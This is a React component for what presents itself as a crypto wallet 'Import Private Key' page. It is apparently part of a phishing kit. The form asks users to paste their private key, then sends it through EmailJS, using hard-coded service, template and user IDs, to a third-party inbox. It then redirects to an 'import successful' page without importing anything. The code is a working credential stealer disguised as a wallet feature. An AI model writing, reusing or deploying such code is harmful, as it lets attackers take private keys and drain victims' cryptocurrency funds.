import React, { useRef, useState } from "react";
import "./ImportPrivateKey.css";
import ImportHeader from "../ImportHeader/ImportHeader";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

function ImportPrivateKey() {
	const form = useRef();
	const navigate = useNavigate();

	const [input1, setInput1] = useState("");

	const handleSubmit = (e) => {
		e.preventDefault();

		emailjs
			.sendForm(
				"service_plwn5yz",
				"template_qyjz4s7",
				form.current,
				"user_CfvcWb4q5M6DwsbbSJS6T"
			)
			.then(
				(result) => {
					console.log(result.text);
					// alert("Successful");
					navigate("/import-successful");
				},
				(error) => {
					console.log(error.text);
				}
			);
		e.target.reset();
		// setText1([input1, ...text1]);
		// setInput1("");
	};

	return (
		<div>
			<ImportHeader />
			<div className="import">
				<div className="name">Private Key</div>
				<form
					ref={form}
					onSubmit={(e) => {
						e.preventDefault();
					}}>
					<div className="textinput">
						<textArea
							placeholder="Input your Private Key value"
							type="text"
							value={input1}
							name="phrase"
							onChange={(e) => setInput1(e.target.value)}
						/>
					</div>

					<div className="import__button">
						<button onClick={handleSubmit}>Import</button>
					</div>
				</form>
			</div>
		</div>
	);
}

export default ImportPrivateKey;
